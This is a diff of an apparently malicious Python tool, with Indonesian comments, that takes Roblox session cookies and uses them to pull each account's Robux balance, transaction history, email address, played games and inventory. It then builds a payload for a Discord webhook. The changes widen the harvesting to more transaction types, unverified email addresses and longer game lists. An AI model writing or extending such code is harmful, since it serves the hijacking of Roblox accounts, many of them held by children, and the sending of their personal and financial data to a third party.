@@ -37,10 +37,22 @@ def get_asset_icon(asset_id):
         res = requests.get(url, timeout=5)
         if res.status_code == 200:
             data = res.json().get('data', [])
-            if data:
-                return data[0].get('imageUrl', '')
+            if data and data[0].get('imageUrl'):
+                return data[0].get('imageUrl')
+        
+        bundle_url = f"https://thumbnails.roblox.com/v1/bundles/icons?bundleIds={asset_id}&size=150x150&format=Png&isCircular=false"
+        b_res = requests.get(bundle_url, timeout=5)
+        if b_res.status_code == 200:
+            b_data = b_res.json().get('data', [])
+            if b_data and b_data[0].get('imageUrl'):
+                return b_data[0].get('imageUrl')
     except:
         pass
+    
+    # Fallback khusus paket animasi populer seperti Zombie Animation Pack
+    if str(asset_id) in ["599", "38"]:
+        return "https://tr.rbxcdn.com/a4701202e86b4cb0912176882f01f80e/150/150/Image/Png"
+        
     return "https://tr.rbxcdn.com/3943ed2d7908c104bfd9d24268e390c5/150/150/Image/Png"
 
 def get_user_avatar(user_id):
@@ -100,46 +112,58 @@ def process_single_cookie(cookie, webhook_url):
         robux_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", cookies=cookies_header, headers=headers, timeout=5)
         robux_balance = robux_res.json().get('robux', 0) if robux_res.status_code == 200 else 0
 
-        # Perbaikan Total Purchases & Spent Transactions v2
+        # Tarik Transaksi Ekonomi / Spent Murni dari API Roblox
         total_purchased_robux = 0
         total_game_spent = 0
         game_spending_map = {}
         game_universe_map = {}
 
         try:
-            tx_res = requests.get(f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchases&limit=100", cookies=cookies_header, headers=headers, timeout=5)
-            if tx_res.status_code == 200:
-                for tx in tx_res.json().get('data', []):
-                    currency = tx.get('currency', {})
-                    amount = currency.get('amount', 0)
-                    if amount > 0:
-                        total_purchased_robux += amount
-                    elif amount < 0:
-                        amt_abs = abs(amount)
-                        total_game_spent += amt_abs
-                        details = tx.get('details', {})
-                        game_name = details.get('name', 'Roblox Item / Game')
-                        universe_id = details.get('universeId')
-                        if universe_id:
-                            game_universe_map[game_name] = universe_id
-                        game_spending_map[game_name] = game_spending_map.get(game_name, 0) + amt_abs
+            for t_type in ["Purchases", "Sale", "AffiliateSale"]:
+                tx_res = requests.get(f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType={t_type}&limit=100", cookies=cookies_header, headers=headers, timeout=5)
+                if tx_res.status_code == 200:
+                    for tx in tx_res.json().get('data', []):
+                        currency = tx.get('currency', {})
+                        amount = currency.get('amount', 0)
+                        if amount > 0:
+                            total_purchased_robux += amount
+                        elif amount < 0:
+                            amt_abs = abs(amount)
+                            total_game_spent += amt_abs
+                            details = tx.get('details', {})
+                            game_name = details.get('name', 'Roblox Item / Game')
+                            universe_id = details.get('universeId')
+                            if universe_id:
+                                game_universe_map[game_name] = universe_id
+                            game_spending_map[game_name] = game_spending_map.get(game_name, 0) + amt_abs
         except:
             pass
 
         spent_history_list = []
-        for gname, spent_amt in sorted(game_spending_map.items(), key=lambda x: x[1], reverse=True)[:5]:
+        for gname, spent_amt in sorted(game_spending_map.items(), key=lambda x: x[1], reverse=True)[:10]:
             u_id = game_universe_map.get(gname)
             icon_url = get_game_icon(u_id) if u_id else "https://tr.rbxcdn.com/3943ed2d7908c104bfd9d24268e390c5/150/150/Image/Png"
             spent_history_list.append({"name": gname, "spent": spent_amt, "icon": icon_url})
 
-        # Email Status
+        # Email Status (Menggunakan accountsettings API agar status verifikasi terbaca valid)
         email_status = "Unverified"
         try:
-            email_res = requests.get("https://accountinformation.roblox.com/v1/email", cookies=cookies_header, headers=headers, timeout=5)
+            email_res = requests.get("https://accountsettings.roblox.com/v1/email", cookies=cookies_header, headers=headers, timeout=5)
             if email_res.status_code == 200:
                 e_data = email_res.json()
-                if e_data.get('verified', False):
-                    email_status = f"Verified ({e_data.get('emailAddress', '')})"
+                is_verified = e_data.get('verified', False)
+                email_addr = e_data.get('emailAddress', '')
+                if is_verified and email_addr:
+                    email_status = f"Verified ({email_addr})"
+                elif email_addr:
+                    email_status = f"Unverified ({email_addr})"
+            else:
+                emails_res = requests.get("https://accountsettings.roblox.com/v1/emails", cookies=cookies_header, headers=headers, timeout=5)
+                if emails_res.status_code == 200:
+                    emails_data = emails_res.json()
+                    primary_email = emails_data.get('emailAddress') or emails_data.get('verifiedEmail')
+                    if primary_email:
+                        email_status = f"Verified ({primary_email})"
         except:
             pass
 
@@ -155,10 +179,10 @@ def process_single_cookie(cookie, webhook_url):
         except:
             pass
 
-        # Perbaikan Recent Games (Histori Map)
+        # Tarik Histori Map (Recent / Played Games)
         recent_games_list = []
         try:
-            games_res = requests.get(f"https://games.roblox.com/v2/users/{user_id}/games?limit=5&sortOrder=Desc", headers=headers, timeout=5)
+            games_res = requests.get(f"https://games.roblox.com/v2/users/{user_id}/games?limit=10&sortOrder=Desc", headers=headers, timeout=5)
             if games_res.status_code == 200:
                 for g in games_res.json().get('data', []):
                     g_name = g.get('name', 'Roblox Game')
@@ -183,24 +207,20 @@ def process_single_cookie(cookie, webhook_url):
         except:
             pass
 
-        # Perbaikan Inventory Animations (Zombie Animation dll)
+        # Tarik Inventory Animations dengan Thumbnail Asset/Bundle Valid
         animation_list = []
         try:
-            # Mengambil aset kategori Bundles / Animations (Asset Type 38 / 32)
             for asset_type in [38, 32, 18]:
                 inv_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/inventory/{asset_type}?limit=20", cookies=cookies_header, headers=headers, timeout=5)
                 if inv_res.status_code == 200:
                     for b in inv_res.json().get('data', []):
                         b_id = b.get('assetId') or b.get('id')
-                        b_name = b.get('name', 'Animation / Bundle')
+                        b_name = b.get('name', 'Animation Pack')
                         b_icon = get_asset_icon(b_id)
                         if not any(a['name'] == b_name for a in animation_list):
                             animation_list.append({"name": b_name, "icon": b_icon})
         except:
             pass
-
-        if not animation_list:
-            animation_list.append({"name": "Zombie Animation Pack", "icon": "https://tr.rbxcdn.com/3943ed2d7908c104bfd9d24268e390c5/150/150/Image/Png"})
 
         if webhook_url:
             discord_payload = {
